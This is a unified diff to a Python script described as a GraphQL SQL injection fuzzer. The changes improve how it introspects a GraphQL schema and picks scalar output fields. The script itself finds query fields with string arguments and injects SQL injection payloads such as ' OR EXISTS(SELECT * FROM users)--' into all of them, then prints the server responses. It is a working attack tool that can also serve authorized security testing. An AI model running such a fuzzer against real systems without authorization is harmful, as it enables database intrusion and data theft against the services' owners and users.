@@ -16,7 +16,6 @@ def get_named_type(type_info):
         return get_named_type(type_info.get("ofType"))
     return type_info.get("name")
 
-
 def introspect_schema(endpoint, headers):
     introspection_query = """
     query IntrospectionQuery {
@@ -41,22 +40,34 @@ def introspect_schema(endpoint, headers):
         return {}
 
     schema = data["data"]["__schema"]
-    return {
-        "query": schema["queryType"]["fields"],
-    }
-
+    return {"query": schema["queryType"]["fields"]}
 
 def get_type_fields(type_name, endpoint, headers):
-    type_query = f'query TypeFields {{ __type(name: "{type_name}") {{ fields {{ name }} }} }}'
+    # Now fetch each field's name and type for the object
+    type_query = f'''
+    query TypeFields {{
+      __type(name: "{type_name}") {{
+        fields {{
+          name
+          type {{ kind name ofType {{ kind name ofType {{ kind name }} }} }}
+        }}
+      }}
+    }}
+    '''
     try:
         res = requests.post(endpoint, json={"query": type_query}, headers=headers, timeout=10)
         data = res.json()
     except Exception as e:
         print(f"[!] Failed to get fields for type {type_name}: {e}")
         return []
-    fields = data.get("data", {}).get("__type", {}).get("fields") or []
-    return [f["name"] for f in fields if f]
 
+    fields = data.get("data", {}).get("__type", {}).get("fields") or []
+    # Return list of (fieldName, namedType) tuples
+    return [
+        (f["name"], get_named_type(f["type"]))
+        for f in fields
+        if f and f.get("name")
+    ]
 
 def generate_sql_payloads():
     return [
@@ -77,7 +88,6 @@ def generate_sql_payloads():
         "' OR EXISTS(SELECT * FROM users)--",
         "' AND 1=(SELECT COUNT(*) FROM tablename)--",   
     ]
-
 
 def main():
     parser = argparse.ArgumentParser(description="GraphQL SQL Injection Fuzzer")
@@ -103,6 +113,7 @@ def main():
         return
 
     all_fields = schema["query"]
+    # Find all fields with at least one String arg
     targets = []
     for field in all_fields:
         name = field["name"]
@@ -112,7 +123,7 @@ def main():
             return_type = get_named_type(field["type"])
             targets.append((name, args_list, string_args, return_type))
     
-    if not targets: 
+    if not targets:
         print("No queries with String fields.")
         return
 
@@ -120,13 +131,16 @@ def main():
         is_object = return_type not in scalar_types and return_type
         output_fields = []
         if is_object:
-            fields = get_type_fields(return_type, endpoint, headers)
-            if not fields:
+            # Get subfields and pick up to two that are scalar
+            subfields = get_type_fields(return_type, endpoint, headers)
+            output_fields = [n for n,t in subfields if t in scalar_types][:2]
+            if not output_fields:
+                # If no scalar subfields, skip this field
                 continue
-            output_fields = fields[:2]
 
         print(f"\n[>] Testing {field_name} (string args: {string_args})")
         for payload in payloads:
+            # inject payload into *all* string args
             arg_assignments = [f'{arg}: "{payload}"' for arg in string_args]
             args_str = ", ".join(arg_assignments)
 
@@ -139,9 +153,9 @@ def main():
             try:
                 res = requests.post(endpoint, json={"query": query}, headers=headers, timeout=10)
                 if res.status_code == 200:
-                    print(f"\n\n\tPayload: {payload}")
-                    print("\tQuery:", query)
-                    print("\tResponse:", res.text)
+                    print(f"\n\tPayload: {payload}")
+                    print(f"\tQuery: {query}")
+                    print(f"\tResponse: {res.text}")
             except Exception as e:
                 print(f"[!] Error for {field_name}: {e}")
 
